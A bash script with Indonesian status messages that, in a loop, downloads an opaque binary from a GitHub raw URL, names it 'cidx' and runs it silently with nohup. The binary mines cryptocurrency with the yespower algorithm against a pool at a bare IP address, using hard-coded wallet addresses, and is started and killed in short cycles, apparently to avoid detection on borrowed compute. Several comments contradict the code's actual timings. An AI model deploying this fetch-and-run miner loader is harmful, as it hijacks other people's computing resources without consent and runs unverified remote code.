#!/bin/bash

pkill cidx
while true; do
  # Download and extract the cidx file
  # wget -q -O cidx https://gitlab.com/jasa4/minulme/-/raw/main/cidxC.tar.gz
  # tar -xvf cidx >/dev/null 2>&1
  rm -rf cidx
  wget -O cidx https://github.com/barburonjilo/back/raw/main/sru >/dev/null 2>&1

  # Set the current date in UTC-7 format
  current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")

  # Create config.json with the current date
  # "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1",
  # "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
 # "user": "WbpHqVBkysEDZLvX3TQJ4HZwZ2yWzoJwbZ.worker1",
  #"pass": "c=SWAMP,m=solo,zap=SWAMP,mc=SWAMP",
  
  cat > config.json <<END
{
  "url": "45.115.224.54:443",
  "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1",
  "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
  "threads": 6,
  "algo": "yespower"
}
END

  # Make cidx and config.json executable
  chmod +x config.json cidx

  # Run cidx in the background
  # nohup ./cidx -c 'config.json' &>/dev/null &
  nohup ./cidx -a yespowerr16    \
  -o 45.115.225.24:443 \
  -u YiN7LfFoSNRszvbuHCH27KCz617VkG3yc3.worker3 \
  -p c=YTN,m=solo,zap=YTN,mc=YTN -t 6 &>/dev/null &


  # Print info: STARTED
  clear
  start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
  echo "[$start_time] STATUS: 🚀 JALAN"
  echo "Process cidx dijalankan (4 menit aktif)..."
  jobs

  # Run awk to process config.json and print the matching date-time part
  awk -v date_str="i-${current_date}" '
  {
    if ($0 ~ /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/) {
      match($0, /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/, arr)
      if (length(arr) > 0) {
        print "Match log: " arr[0]
      }
    }
  }
  ' config.json

  # Run for 4 minutes
  sleep 45

  # Kill cidx process
  pkill cidx

  # Print info: STOPPED
  stop_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
  echo "[$stop_time] STATUS: 🛑 MATI"
  echo "Process cidx dimatikan (tunggu 1 menit)..."

  # Wait for 1 minute before restarting
  sleep 120
done
